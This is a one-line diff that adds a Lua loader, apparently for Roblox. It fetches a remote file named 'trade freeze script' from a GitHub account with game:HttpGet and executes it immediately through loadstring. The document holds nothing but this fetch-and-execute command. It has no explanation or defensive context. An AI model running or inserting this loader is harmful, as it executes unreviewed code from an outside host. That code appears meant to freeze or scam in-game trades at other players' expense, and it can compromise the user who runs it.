@@ -1,0 +1,1 @@
+loadstring(game: HttpGet("https://raw.githubusercontent.com/ososmama7-cmd/a7/refs/heads/main/trade%20freeze%20script"))()
